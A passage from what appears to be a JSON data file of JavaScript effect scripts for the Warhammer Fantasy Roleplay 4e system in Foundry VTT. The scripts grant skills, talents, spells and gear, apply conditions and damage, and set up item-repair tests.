game.wfrp4e.utility.findSkill(skill)\n        skillItem = skillItem.toObject();\n        skillItem.system.advances.value = skillAdvancements[index];\n        items.push(skillItem);\n    }\n}\n\nfor (let talent of talents)\n{\n    let talentItem = await game.wfrp4e.utility.findTalent(talent)\n    if (talentItem)\n    {\n        items.push(talentItem.toObject());\n    }\n    else \n    {\n        ui.notifications.warn(`Could not find ${talent}`, {permanent : true})\n    }\n}\n\nfor (let trapping of trappings) \n{\n    let trappingItem = await game.wfrp4e.utility.findItem(trapping)\n    if (trappingItem)\n    {\n        trappingItem = trappingItem.toObject()\n\n        equip(trappingItem)\n\n        items.push(trappingItem);\n    }\n    else \n    {\n        ui.notifications.warn(`Could not find ${trapping}`, {permanent : true})\n    }\n}\n\nlet filters = [\n    {\n        property : \"type\",\n        value : \"spell\"\n    },\n    {\n        property : \"system.lore.value\",\n        value : \"petty\"\n    }\n]\n\nlet petty = (await game.wfrp4e.apps.ItemDialog.createFromFilters(filters, 3, \"Choose 3 Petty Spells\")).map(i => i.toObject());\n\n\nfilters = [\n    {\n        property : \"type\",\n        value : \"spell\"\n    },\n    {\n        property : \"system.lore.value\",\n        value : \"\"\n    }\n]\n\nlet arcane = (await game.wfrp4e.apps.ItemDialog.createFromFilters(filters, 2, \"Choose 2 Arcane Spells\")).map(i => i.toObject());\n\nfilters = [\n    {\n        property : \"type\",\n        value : \"spell\"\n    },\n    {\n        property : \"name\",\n        value: /^((?!\\().)*$/gm, // Remove all spells with parentheses (all arcane spells spells)\n        regex: true\n    },\n    {\n        property : \"system.lore.value\",\n        value : \"necromancy\"\n    }\n]\n\nlet necromancy = (await game.wfrp4e.apps.ItemDialog.createFromFilters(filters, 1, \"Choose 1 Necromancy Spell\")).map(i => i.toObject());\n\narcane.forEach(i => {\n    i.img = \"modules/wfrp4e-core/icons/spells/necromancy.png\";\n    i.system.lore.value = \"necromancy\";\n})\nlet spells = [...petty, ...necromancy, ...arcane];\n\nupdateObj.name = updateObj.name += \" \" + this.effect.name\nawait this.actor.update(updateObj)\nthis.actor.createEmbeddedDocuments(\"Item\", items.concat(spells));\n\nfunction equip(item)\n{\n    if (item.type == \"armour\")\n        item.system.worn.value = true\n    else if (item.type == \"weapon\")\n        item.system.equipped = true\n    else if (item.type == \"trapping\" && item.system.trappingType.value == \"clothingAccessories\")\n        item.system.worn = true\n}","UTlgF4azrGQZsoDv":"const talents = await Promise.all([\"Ambidextrous\", \"Distract\"].map(game.wfrp4e.utility.findTalent))\nthis.actor.createEmbeddedDocuments(\"Item\", talents, {fromEffect : this.effect.id})","UWrzokgabRKUpnkG":"return [\"t\", \"wp\", \"ag\", \"i\", \"int\"].includes(args.characteristic)","UXdlnmwVgjc1QpF2":"args.actor.system.details.move.value += 1;\nargs.actor.system.status.carries.max = Math.floor(args.actor.system.status.carries.max * 0.75);","UYLXm2W6jVn21Age":"args.fields.modifier += 40;","UaImulhbPURkLJg2":"return this.actor.attacker && (args.skill?.name.includes(\"Melee (Basic)\") || (args.type == \"weapon\" && args.item?.system.weaponGroup.value == \"basic\"))","UgQW0UMPOZ0jwfVJ":"let current = this.actor.status.fortune.value\n\nthis.actor.update({\"system.status.fortune.value\" : 1 + current})\n\nthis.script.scriptMessage(`<b>${this.actor.prototypeToken.name}</b> fortune points increased from ${current} to ${1 + current}`)","UlRSaZG4ZUU6fMND":"const repaired_message = `<p>Finished repairing <em>${this.item.name}</em>.</p>`;\nconst test = 'Trade (Carpenter)';\nconst difficulty = 'challenging';\nconst target = 10;\n\nconst extendedTestData = {\n  name: this.item.name,\n  type: \"extendedTest\",\n  img: this.item.img,\n  system: {\n    SL: {\n      current: 0,\n      target: target\n    },\n    test: {\n      value: test\n    },\n    completion: {\n      value: \"remove\"\n    },\n    difficulty: {\n      value: difficulty\n    }\n  },\n  effects: [\n    {\n      name: `Repair the ${this.item.name}`,\n      icon: this.item.img,\n      flags: {\n        wfrp4e: {\n          applicationData: {\n            type: \"document\",\n            documentType: \"Item\"\n          },\n          scriptData: [\n            {\n              label: this.item.name,\n              script: `\n              let id = this.item.flags.wfrp4e.fromEffect;\n              let effect = this.actor.appliedEffects.find(e => e.id === id);\n              this.script.scriptMessage(\"${repaired_message}\");\n              await effect.item.delete();\n            `,\n              trigger: \"deleteEffect\"\n            }\n          ]\n        }\n      }\n      }\n  ]\n};\n\nawait this.actor.createEmbeddedDocuments(\"Item\", [extendedTestData], {fromEffect: this.effect.id});\n","Um6xMMiUftLXJxEt":"return [\"fel\", \"dex\"].includes(args.characteristic)","UnqnWi0dZYLf5fTT":"let choice1 = [\n    {\n        type : \"armour\",\n        name : \"Mail Chausses\"\n    },\n    {\n        type : \"armour\",\n        name : \"Mail Coat\"\n    },\n    {\n        type : \"armour\",\n        name : \"Mail Coif\"\n    },\n]\nlet choice2 = [\n    {\n        type : \"armour\",\n        name : \"Mail Chausses\"\n    },\n    {\n        type : \"armour\",\n        name : \"Mail Coat\"\n    },\n    {\n        type : \"armour\",\n        name : \"Mail Coif\"\n    },\n    {\n        type : \"armour\",\n        name : \"Leather Leggings\"\n    },\n    {\n        type : \"armour\",\n        name : \"Leather Skullcap\"\n    },\n    {\n        type : \"armour\",\n        name : \"Leather Jack\"\n    },\n]\nlet choice3 = [\n    {\n        type : \"armour\",\n        name : \"Plate Breastplate\"\n    },\n    {\n        type : \"armour\",\n        name : \"Plate Bracers\"\n    },\n    {\n        type : \"armour\",\n        name : \"Plate Helm\"\n    },\n    {\n        type : \"armour\",\n        name : \"Plate Leggings\"\n    },\n]\n\nlet choice = await Dialog.wait({\n    title : \"Choice\",\n    content : \n    `<p>\n    Select your choice\n    </p>\n    <ol>\n    <li>Mail</li>\n    <li>Mail & Leather</li>\n    <li>Plate</li>\n    </ol> \n    `,\n    buttons : {\n        1 : {\n            label : \"Mail\",\n            callback : () => {\n                return choice1\n            }\n        },\n        2 : {\n            label : \"Mail & Leather\",\n            callback : () => {\n                return choice2\n            }\n        },\n        3 : {\n            label : \"Plate\",\n            callback : () => {\n                return choice3\n            }\n        }\n    }\n})\n\nlet updateObj = this.actor.toObject();\nlet items = []\nfor (let c of choice)\n{\n    let existing \n    if (c.type == \"skill\")\n    {\n        existing = updateObj.items.find(i => i.name == c.name && i.type == c.type)\n        if (existing && c.diff?.system?.advances?.value)\n        {\n            existing.system.advances.value += c.diff.system.advances.value\n        }\n    }\n\n    if (!existing)\n    {\n        let item = await game.wfrp4e.utility.find(c.name, c.type)\n        if (item)\n        {\n            item = item.toObject()\n            equip(item);\n                items.push(foundry.utils.mergeObject(item, (c.diff || {})))\n        }\n        else\n            ui.notifications.warn(`Could not find ${c.name}`, {permanent : true})\n    }\n\n}\nawait this.actor.update(updateObj)\nthis.actor.createEmbeddedDocuments(\"Item\", items);\n\nfunction equip(item)\n{\n    if (item.type == \"armour\")\n        item.system.worn.value = true\n    else if (item.type == \"weapon\")\n        item.system.equipped = true\n    else if (item.type == \"trapping\" && item.system.trappingType.value == \"clothingAccessories\")\n        item.system.worn = true\n}","UsAHQecRlWL5PhP6":"this.actor.setupSkill(game.i18n.localize(\"NAME.Cool\"), {skipTargets: true, appendTitle :  ` - ${this.effect.name}`, fields: {difficulty : \"average\"}}).then(async test =>\n{\n     await test.roll()\n     if (test.failed)\n     {\n         this.actor.corruptionDialog(\"moderate\")    \n     }\n})","UsuwsmU1TUQLQVM2":"let lore = this.effect.name.split(\"(\")[1].split(\")\")[0].toLowerCase();\nreturn !args.spell || (args.type == \"cast\" && [\"petty\", lore].includes(args.spell.system.lore.value));","UtqUthabeQ4rHDLQ":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.Item.tNWrJUOArwfWXsPw\");\nthis.actor.createEmbeddedDocuments(\"Item\", [item], {fromEffect: this.effect.id});","Uvk1X7sEhvv77YkD":"if (!args.flags.distractingApplied)\n{\n    args.fields.modifier -= 20;\n    args.flags.distractingApplied = true;\n}","UvycHOjSPm5Zv9KJ":"let test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Dodge\"), {skipTargets: true, appendTitle :  ` - ${this.effect.name}`})\nawait test.roll();\nlet baseDamage = \"4\";\nif (test.succeeded)\n    baseDamage = \"0\";\n   \nlet damage = this.effect.sourceItem.system.computeSpellDamage(baseDamage, true) + parseInt(this.effect.sourceTest.result.SL);\n\nthis.script.scriptMessage(await this.actor.applyBasicDamage(damage, {suppressMsg : true}))\nthis.actor.addCondition(\"ablaze\")","UwjkHRAQHESdYXJs":"this.actor.getActiveTokens().forEach(t => t.document.update({light : {\n    \"dim\": 2,\n    \"bright\": 1,\n    \"alpha\": 0.5,\n    \"animation\": {\n        \"speed\": 4,\n        \"intensity\": 4,\n        \"type\": \"pulse\",\n    },\n    \"color\": \"#949bff\",\n}}));","Ux4buMc7llF1Kg8p":"if (!this.actor.hasCondition(\"stunned\") && !this.actor.hasCondition(\"unconcscious\"))\n{\n    this.effect.delete();\n}","V1D2Uo3WDKYQePU3":"let damage = this.effect.sourceTest.result.damage;\n        \nlet loc = \"head\"\nlet APatLoc = this.actor.system.status.armour[loc];\n\nlet metalAP = APatLoc.layers.reduce((metal, layer) => metal += (layer.metal ? layer.value : 0), 0)\n\nlet APused = Math.max(0, APatLoc.value - metalAP); // remove metal AP at location;\n\ndamage -= (APused + this.actor.system.characteristics.t.bonus)\n\nlet msg = await this.actor.applyBasicDamage(damage, {suppressMsg : true, damageType : game.wfrp4e.config.DAMAGE_TYPE.IGNORE_ALL});\nmsg += ` (ignored ${metalAP} metal AP on ${game.wfrp4e.config.locations[loc]})`\nthis.script.scriptMessage(msg)\n","V2lsVTi6q28eL5jl":"args.fields.slBonus += parseInt(this.effect.sourceTest.result.SL)","V7qmFwUMCY2tfziH":"this.actor.addCondition(\"stunned\")","V9wD9FWHWxZUOGSI":"let roll = await (new Roll(`max(0, 1d10 - ${this.actor.characteristics.wp.bonus})`).roll())\nlet fatigued = roll.total\nroll.toMessage(this.script.getChatData());\nif (fatigued > this.actor.characteristics.wp.bonus)\n{\n    this.actor.addCondition(\"unconscious\")\n    this.script.scriptNotification(`Fell Unconscious`)\n}\nelse \n{\n    fatigued = Math.max(0, fatigued)\n    if (fatigued)\n        this.actor.addCondition(\"fatigued\", fatigued)\n    this.script.scriptNotification(`Gained ${fatigued} conditions`)\n}","V9xm4X1x3lPYTQaI":"if (args.extendedTest?.getFlag(\"wfrp4e\", \"fear\"))\n{\n\tthis.script.scriptNotification(\"Immune to Fear\");\n\targs.extendedTest.delete();\n\targs.abort = true;\n}","V9zm2hKUVLVZtAcN":"let characteristics = {\n  \"ws\" : -10,\n  \"bs\" : -10,\n  \"s\" : 0,\n  \"t\" : 15,\n  \"i\" : 15,\n  \"ag\" : -20,\n  \"dex\" : 0,\n  \"int\" : 20,\n  \"wp\" : 10,\n  \"fel\" : 10\n}\nlet skills = [\"Charm\", \"Channelling\", \"Entertain (Prophecy)\", \"Intuition\"]\nlet skillAdvancements = [0, 0, 20, 10]\nlet talents = [\"Detect Artefact\", \"Menacing\", \"Sixth Sense\"]\nlet traits = [\"Dooming\", \"Spellcaster (Lore of Life)\", \"Ward\"]\nlet trappings = []\nlet items = [];\nlet spells = [\"Forest of Thorns\"];\n\nlet updateObj = this.actor.toObject();\n\nfor (let ch in characteristics)\n{\n  updateObj.system.characteristics[ch].modifier += characteristics[ch];\n}\n\nfor (let index = 0; index < skills.length; index++)\n{\n  let skill = skills[index]\n  let skillItem;\n  skillItem = updateObj.items.find(i => i.name == skill && i.type == \"skill\")\n  if (skillItem)\n      skillItem.system.advances.value += skillAdvancements[index]\n  else \n  {\n      skillItem = await game.wfrp4e.utility.findSkill(skill)\n      skillItem = skillItem.toObject();\n      skillItem.system.advances.value = skillAdvancements[index];\n      items.push(skillItem);\n  }\n}\n\nfor (let talent of talents)\n{\n  let talentItem = await game.wfrp4e.utility.findTalent(talent)\n  if (talentItem)\n  {\n      items.push(talentItem.toObject());\n  }\n  else \n  {\n      ui.notifications.warn(`Could not find ${talent}`, {permanent : true})\n  }\n}\n\nconst traitRegex = /(?:,?(.+?)(\\+?\\d{1,2}\\+?)?\\s*?(?:\\((.+?)\\)\\s*(\\+?\\d{1,2})?|,|$))/gm\nfor (let trait of traits)\n{\n  let traitMatches = trait.matchAll(traitRegex).next().value\n  let traitName = traitMatches[1]\n  let traitVal = traitMatches[2] || traitMatches[4] // could be match 2 or 4 depending on if there's a specialization\n  let traitSpec = traitMatches[3]\n\n  let traitItem;\n  try {\n      traitItem = await WFRP_Utility.findItem(traitName, \"trait\")\n  }\n  catch { }\n  if (!traitItem) {\n      ui.notifications.warn(`Could not find ${trait}`, {permanent : true})\n  }\n  traitItem = traitItem.toObject()\n\n  if (Number.isNumeric(traitVal))\n  {\n      traitItem.system.specification.value = traitName.includes('Weapon','Horns','Tail','Tentacles','Bite') ? traitVal - parseInt(characteristicValues[3]/10) : traitVal;\n      traitItem.name = (traitItem.name +  ` ${traitSpec ? \"(\"+ traitSpec + \")\" : \"\"}`).trim()\n  }\n  else \n      traitItem.system.specification.value = traitSpec\n\n  items.push(traitItem)\n\n}\n\nfor (let trapping of trappings) \n{\n  let trappingItem = await game.wfrp4e.utility.findItem(trapping)\n  if (trappingItem)\n  {\n      trappingItem = trappingItem.toObject()\n\n      equip(trappingItem)\n\n      items.push(trappingItem);\n  }\n  else \n  {\n      ui.notifications.warn(`Could not find ${trapping}`, {permanent : true})\n  }\n}\n\nfor (let spell of spells) \n{\n  let spellItem = await game.wfrp4e.utility.findItem(spell)\n  if (spellItem)\n  {\n      spellItem = spellItem.toObject()\n\n      items.push(spellItem);\n  }\n  else \n  {\n      ui.notifications.warn(`Could not find ${spell}`, {permanent : true})\n  }\n}\n\nupdateObj.name = updateObj.name += \" \" + this.effect.name\n\nawait this.actor.update(updateObj)\nthis.actor.createEmbeddedDocuments(\"Item\", items);\n\n\nfunction equip(item)\n{\n  if (item.type == \"armour\")\n      item.worn = true\n  else if (item.type == \"weapon\")\n      item.equipped = true\n  else if (item.type == \"trapping\" && item.trappingType?.value == \"clothingAccessories\")\n      item.worn = true\n}","VAPsww9x3HAw1sKP":"return !args.options.dodge","VAs1nXvicdQK18Do":"return args.skill?.name.includes(game.i18n.localize(\"NAME.Language\"));","VINX6TBAJQznhVcN":"const repaired_message = `<p>Finished replacing <em>${this.item.name}</em> with a makeshift one.</p>`;\nconst test = 'Maintenance Crew Test';\nconst difficulty = 'hard';\nconst target = 80;\n\nconst extendedTestData = {\n  name: this.item.name,\n  type: \"extendedTest\",\n  img: this.item.img,\n  system: {\n    SL: {\n      current: 0,\n      target: target\n    },\n    test: {\n      value: test\n    },\n    completion: {\n      value: \"remove\"\n    },\n    difficulty: {\n      value: difficulty\n    }\n  },\n  effects: [\n    {\n      name: `Repair the ${this.item.name}`,\n      icon: this.item.img,\n      flags: {\n        wfrp4e: {\n          applicationData: {\n            type: \"document\",\n            documentType: \"Item\"\n          },\n          scriptData: [\n            {\n              label: this.item.name,\n              script: `\n              let id = this.item.flags.wfrp4e.fromEffect;\n              let effect = this.actor.appliedEffects.find(e => e.id === id);\n              this.script.scriptMessage(\"${repaired_message}\");\n              await effect.item.delete();\n            `,\n              trigger: \"deleteEffect\"\n            }\n          ]\n        }\n      }\n      }\n  ]\n};\n\nawait this.actor.createEmbeddedDocuments(\"Item\", [extendedTestData], {fromEffect: this.effect.id});\n","VKpKq4RSbI1KkUQK":"this.actor.flags.useless[this.effect.getFlag(\"wfrp4e\", \"location\")] = true;","VLdF2HPnCrNIgp7a":"let items = [];\n\nlet etiquette = (await fromUuid(\"Compendium.wfrp4e-core.items.Item.sYbgpSnRqSZWgwFP\")).toObject();\netiquette.name += \" (Followers of Khorne)\";\n\nitems.push(etiquette);\n\nlet animosity = (await fromUuid(\"Compendium.wfrp4e-core.items.Item.0VpT5yubw4UL7j6f\")).toObject();\n  animosity.system.specification.value = \"Followers of Slaanesh\";\n\nitems.push(animosity);\n\nawait this.actor.createEmbeddedDocuments(\"Item\", items, {fromEffect : this.effect.id});\n","VNOKTzCrFbZ6PJUj":"return ![\"Charm Animal\", \"Endurance\", \"Outdoor Survival\"].includes(args.skill?.name)","VQaC6ynouW5EQCbC":"let roll = await new Roll(\"1d10\").roll();\n\nawait roll.toMessage(this.script.getChatData());\n\nthis.script.scriptMessage(await this.actor.applyBasicDamage(roll.total, {damageType : game.wfrp4e.config.DAMAGE_TYPE.IGNORE_ALL, suppressMsg : true}));\n\nlet test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Endurance\"), {skipTargets: true, appendTitle :  \" - \" + this.effect.name});\nawait test.roll();\n\nif (test.succeeded)\n{\n    return false;\n}","VTS4RzbmReI87K9a":"args.fields.slBonus = Math.floor(this.item.system.total.value * 0.1);","Vb7rgl8T4VRswbnZ":"this.actor.status.addArmour(parseInt(this.item.system.specification.value) || 0, {source: this.effect, damage : this.item.getFlag(\"wfrp4e\", \"APdamage\")})","VbL0TgaBAmYjrezZ":"const talents = await Promise.all([\"Hardy\"].map(game.wfrp4e.utility.findTalent))\nthis.actor.createEmbeddedDocuments(\"Item\", talents, {fromEffect : this.effect.id})","Vkuu70BZV4DPYO2Q":"return args.item?.system?.attackType != \"ranged\"","VlFUDaKUYoBYKYn0":"let test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Endurance\"), {skipTargets: true, appendTitle :  ` - ${this.effect.name}`, context : {failure: \"1 Corruption Point Gained\"}})\nawait test.roll();\nif (test.failed && this.actor.type == \"character\")\n{\n    this.actor.update({\"system.status.corruption.value\" : parseInt(this.actor.status.corruption.value) + 1})\n    this.script.scriptMessage(\"Gained a Corruption point\", {whisper : ChatMessage.getWhisperRecipients(\"GM\")})\n}","VlHuDIAvPr8JM1P5":"return args.skill?.name !== game.i18n.localize(\"NAME.Row\");","Vns6WrafVq8NjX7t":"return args.skill?.name != game.i18n.localize(\"NAME.Heal\")","VqTrKPtxv9hpn0Hr":"return args.skill?.name != \"Language (Magick)\"","VuE1mhrB6X6MYTzg":"return args.characteristic == \"fel\"","VurA2XNqC0d9U49C":"this.actor.setupSkill(game.i18n.localize(\"NAME.Endurance\"), {skipTargets: true, appendTitle :  ` - ${this.effect.name}`}).then(async test =>\n{\n     await test.roll()\n     if (test.failed)\n     {\n         this.actor.addCondition(\"fatigued\")    \n     }\n})","VzO0ZDcTWvaBn4vm":"if (args.test.preData.skillName?.includes(game.i18n.localize(\"NAME.Language\")) || args.test instanceof CastTest)\n{\n\tif (parseInt(args.test.result.SL) > 0 || args.test.succeeded)\n\t{\n\t\tif (parseInt(args.test.result.SL) > 0)\n\t\t{\n\t\t\targs.test.result.SL = \"-0\";\n\t\t\targs.test.result.description = game.i18n.localize(\"ROLL.MarginalFailure\");\n\t\t}\n\t\targs.test.result.outcome = \"failure\"\n        args.test.result.other.push(`<strong>${this.effect.name}</strong>: Maximum -0 SL`)\n\t}\n}","VzgTGb5QXKoyPNh3":"if (args.attackerTest.weapon && args.defenderTest.weapon)\n{\n   let attackerReach = game.wfrp4e.config.reachNum[args.attackerTest.weapon.reach.value]\n   let defenderReach = game.wfrp4e.config.reachNum[args.defenderTest.weapon.reach.value]\n   \n   if (attackerReach == defenderReach)\n      defenderReach  = defenderReach < 7 ? defenderReach  + 1 : defenderReach \n\n   attackerReach = game.wfrp4e.utility.findKey(attackerReach, game.wfrp4e.config.reachNum)\n   defenderReach = game.wfrp4e.utility.findKey(defenderReach, game.wfrp4e.config.reachNum)\n\n  args.attackerTest.weapon.reach.value = attackerReach\n  args.defenderTest.weapon.reach.value = defenderReach\n}","W9nyUNQStMr1pUHJ":"if (args.opposedTest.result.hitloc.value == this.item.system.location.key)\n{\n    args.actor.addCondition(\"bleeding\", 1);\n    this.script.scriptNotification(\"Added Bleeding\")\n}","WB6sIpLEPC8YPX67":"if (args.options.dodge)\n{\n\targs.abort = true;\n\tthis.script.scriptNotification(\"Cannot Dodge!\")\n}\nreturn [\"t\", \"int\", \"wp\", \"fel\"].includes(args.characteristic)","WJkwIrdj4NceOYe8":"return args.characteristic !== 'fel';","WKXyVHQwQCNTfSKv":"if ((args.item.type == \"weapon\" || args.item.system.attackType) && !args.item.isMagical )\n{\n    args.item.system.qualities.value.push({name : \"magical\"})\n}","WO5n7Vbx8AgoVrwC":"   let characteristics = {\n            \"ws\" : 0,\n            \"bs\" : 0,\n            \"s\" : 0,\n            \"t\" : 0,\n            \"i\" : 10,\n            \"ag\" : 0,\n            \"dex\" : 0,\n            \"int\" : 10,\n            \"wp\" : 5,\n            \"fel\" : 5\n        }\n        let skills = [\"Intuition\", \"Lore (Local)\", \"Perception\"]\n        let skillAdvancements = [10, 10, 10]\n        let talents = []\n        let trappings = [\"Mail Coat\", \"Mail Chausses\", \"Mail Coif\", \"Hand Weapon\"]\n        let items = []\n\n        let updateObj = this.actor.toObject();\n        \n        for (let ch in characteristics)\n        {\n            updateObj.system.characteristics[ch].modifier += characteristics[ch];\n        }\n        \n        for (let index = 0; index < skills.length; index++)\n        {\n            let skill = skills[index]\n            let skillItem;\n            skillItem = updateObj.items.find(i => i.name == skill && i.type == \"skill\")\n            if (skillItem)\n                skillItem.system.advances.value += skillAdvancements[index]\n            else \n            {\n                skillItem = await game.wfrp4e.utility.findSkill(skill)\n                skillItem = skillItem.toObject();\n                skillItem.system.advances.value = skillAdvancements[index];\n                items.push(skillItem);\n            }\n        }\n        \n        for (let talent of talents)\n        {\n            let talentItem = await game.wfrp4e.utility.findTalent(talent)\n            if (talentItem)\n            {\n                items.push(talentItem.toObject());\n            }\n            else \n            {\n                ui.notifications.warn(`Could not find ${talent}`, {permanent : true})\n            }\n        }\n        \n        for (let trapping of trappings) \n        {\n            let trappingItem = await game.wfrp4e.utility.findItem(trapping)\n            if (trappingItem)\n            {\n                trappingItem = trappingItem.toObject()\n        \n                equip(trappingItem)\n        \n                items.push(trappingItem);\n            }\n            else \n            {\n                ui.notifications.warn(`Could not find ${trapping}`, {permanent : true})\n            }\n        }\n        \n        \n        await this.actor.update(updateObj)\n        this.actor.createEmbeddedDocuments(\"Item\", items);\n        \n        function equip(item)\n        {\n            if (item.type == \"armour\")\n                item.system.worn.value = true\n            else if (item.type == \"weapon\")\n                item.system.equipped = true\n            else if (item.type == \"trapping\" && item.system.trappingType.value == \"clothingAccessories\")\n                item.system.worn = true\n        }","WPQbVpD1uwSLAXq1":"if (this.actor.system.status.wounds.value == 0)\n{\n\tthis.actor.addCondition(\"dead\");\n}","WR0Kqn8CF5iwToak":"const repaired_message = `<p>Finished repairing <em>${this.item.name}</em>.</p>`;\nconst test = 'Trade (Tailor)';\nconst difficulty = 'difficult';\nconst target = 40;\n\nconst extendedTestData = {\n  name: this.item.name,\n  type: \"extendedTest\",\n  img: this.item.img,\n  system: {\n    SL: {\n      current: 0,\n      target: target\n    },\n    test: {\n      value: test\n    },\n    completion: {\n      value: \"remove\"\n    },\n    difficulty: {\n      value: difficulty\n    }\n  },\n  effects: [\n    {\n      name: `Repair the ${this.item.name}`,\n      icon: this.item.img,\n      flags: {\n        wfrp4e: {\n          applicationData: {\n            type: \"document\",\n            documentType: \"Item\"\n          },\n          scriptData: [\n            {\n              label: this.item.name,\n              script: `\n              let id = this.item.flags.wfrp4e.fromEffect;\n              let effect = this.actor.appliedEffects.find(e => e.id === id);\n              this.script.scriptMessage(\"${repaired_message}\");\n              await effect.item.delete();\n            `,\n              trigger: \"deleteEffect\"\n            }\n          ]\n        }\n      }\n      }\n  ]\n};\n\nawait this.actor.createEmbeddedDocuments(\"Item\", [extendedTestData], {fromEffect: this.effect.id});\n","WRe1eGmGVGejPcS8":"let wind = this.effect.name.split(\" \")[2]\nreturn args.type == \"cast\" && game.wfrp4e.config.magicWind[args.item.system.lore.value] == wind;","WTRYAEzwxRuGENyI":"        // Every living creature within 10 yards, other than the wielder of the hammer,\n        // must make a Challenging (+0) Endurance Test \n\n        let test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Endurance\"), {\n            skipTargets: true, appendTitle :  \" - \" + this.effect.name,\n            fields: {difficulty: \"challenging\"}\n        })\n        \n        await test.roll();\n        if (test.failed)\n        {\n            // or gain a Deafened Condition \n            this.actor.addCondition(\"deafened\");\n            // and suffer 1d10 Wounds which bypass armour but not Toughness Bonus.\n            let damage = (await new Roll(\"1d10\").roll());\n            await damage.toMessage(this.script.getChatData());\n            this.script.scriptMessage(await this.actor.applyBasicDamage(damage.total, {damageType : game.wfrp4e.config.DAMAGE_TYPE.IGNORE_AP, suppressMsg: true}))\n        }","WY3DajPRGcMNt158":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.MVI0lXcg6vvtooAF\")\nthis.actor.createEmbeddedDocuments(\"Item\", [item.toObject()], {fromEffect : this.effect.id})","WeTlTniskT3Ej6vg":"args.modifiers.other.push({label : this.effect.name, value : 2})","WiYtNU2Y5BJfIpeM":"let location = this.item.system.location.key;\n\nif (location)\n{\n    let dropped = this.item.system.weaponsAtLocation;\n\n    if (dropped.length)\n    {\n        this.script.scriptNotification(`Dropped ${dropped.map(i => i.name).join(\", \")}!`)\n        for(let weapon of dropped)\n        {\n            await weapon.system.toggleEquip();\n        }\n    }\n}","WnWA0e0bgqBsZp2L":"this.item.update({\"system.twohanded.value\" : !this.item.system.twohanded.value})","Wo4wQKUxSItAhRzZ":"let lore = this.effect.name.split(\"(\")[1].split(\")\")[0].toLowerCase();\n\n// If channelling corresponding lore\nif (args.type == \"channelling\" && args.spell.system.lore.value == lore)\n    args.prefillModifiers.slBonus  += 3\n// If channelling or casting different lore\nelse if (args.spell.system.lore.value != lore && args.spell.system.lore.value != \"petty\")\n    args.prefillModifiers.slBonus  -= 1","WwxXgsNxlccmqTze":"this.actor.addCondition(\"dead\")","WzMmwjZbhyCbHxyZ":"this.actor.status.encumbrance.state += 2\nthis.actor.status.encumbrance.pct = 100;","X08401eOhKJrhNf1":"const grim = this.actor.items.find(i => i.type === \"trait\" && i.name.includes(\"Grim\"));\n\nif (args.options?.deltaAdv > 0 && this.actor.hasCondition(\"engaged\") && grim.specification.value !== 4) {\n  grim.update({\"system.specification.value\": 4});\n}\n\nif (!this.actor.hasCondition(\"engaged\") && grim.specification.value !== 2) {\n  grim.update({\"system.specification.value\": 2});\n}","X3bLbOfcJAftOMa7":"return [\"ws\", \"bs\", \"ag\"].includes(args.characteristic)","X3vpmNUj9SL2CDnF":"let item = args.actor.items.find(i => i.name.includes(\"Flying Jib\"));\nitem.name += ` (Disabled by ${this.item.name})`;","X7ikFOGKYzTMr4d1":"args.fields.difficulty = \"difficult\"","XCAfy460IotarQek":"return false;","XClTZOjuhcxWLF51":"let test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Endurance\"), {fields: {difficulty: \"difficult\"}, skipTargets: true, appendTitle :  ` - ${this.effect.name}`})\nawait test.roll();\n\nif (test.failed)\n{\n    this.actor.addCondition(\"stunned\")\n}\n\n\nlet item = await fromUuid(\"Compendium.wfrp4e-core.items.4lj1ik958mbgAlaF\")\nlet data = item.toObject();\ndata.system.location.key = this.item.system.location.key\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect : this.effect.id})\n","XO9m2AvFRAAeEuty":"if (args.test.options.fieldDressing && args.test.result.reversed)\n{\n\targs.test.data.result.SL = \"+\" + Math.min(1, Number(args.test.data.result.SL))\n\targs.test.result.other.push(`<b>${this.effect.name}</b>: SL limited to 1`)\n}","XPxAKqPpPYE4E6B5":"args.fields.modifier -= 10 * this.effect.conditionValue","XRrGBbplNLZpXnCH":"let item;\nlet items = []\nitem = await fromUuid(\"Compendium.wfrp4e-core.items.rOV2s6PQBBrhpMOv\")\n{\n    let data = item.toObject();\n    items.push(data)\n}\nitem = await fromUuid(\"Compendium.wfrp4e-core.items.VUJUZVN3VYhOaPjj\")\n{\n    let data = item.toObject();\n    data.system.specification.value = 2\n    items.push(data)\n}\nitem = await fromUuid(\"Compendium.wfrp4e-core.items.GbDyBCu8ZjDp6dkj\")\n{\n    let data = item.toObject();\n    items.push(data)\n}\nitem = await fromUuid(\"Compendium.wfrp4e-core.items.a8MC97PLzl10WocT\")\n{\n    let data = item.toObject();\n    items.push(data)\n}\nitem = await fromUuid(\"Compendium.wfrp4e-core.items.pLW9SVX0TVTYPiPv\")\n{\n    let data = item.toObject();\n    data.system.specification.value = 1;\n    items.push(data)\n}\nitem = await fromUuid(\"Compendium.wfrp4e-core.items.pTorrE0l3VybAbtn\")\n{\n    let data = item.toObject();\n    data.system.specification.value = 1;\n    items.push(data)\n}\nitem = await fromUuid(\"Compendium.wfrp4e-core.items.fjd1u9VAgiYzhBRp\")\n{\n    let data = item.toObject();\n    items.push(data)\n}\nitem = await fromUuid(\"Compendium.wfrp4e-core.items.mDgEMOoJpi8DkRYb\")\n{\n    let data = item.toObject();\n    items.push(data)\n}\nitem = await fromUuid(\"Compendium.wfrp4e-core.items.AtpAudHA4ybXVlWM\")\n{\n    let data = item.toObject();\n    data.system.specification.value = 2;\n    items.push(data)\n}\n\nthis.actor.createEmbeddedDocuments(\"Item\", items, {fromEffect : this.effect.id})\n","XXnzUdsIYQ9Wjyu0":"return args.item?.system.attackType != \"ranged\" || args.flags.howlingWarpGale || this.actor.sameSideAs(this.effect.sourceActor)","XYaYeiVkc5GKYTjC":"return args.spell?.system.lore.value != \"fire\"","XcvDYNZgJ2rpAdDV":"\n                            let fatigued = this.actor.hasCondition(\"fatigued\")\n                            if (!fatigued)\n                            {\n                                this.actor.addCondition(\"fatigued\")\n                                ui.notifications.notify(\"Fatigued added to \" + this.actor.name + \" which cannot be removed until the Malaise symptom is gone.\")\n                            }","Xe8ijqWU3bbtq7ZY":"if (args.opposedTest.defenderTest.actor.Species.toLowerCase().includes(\"skaven\"))\n{\n    args.addImpact = true;\n    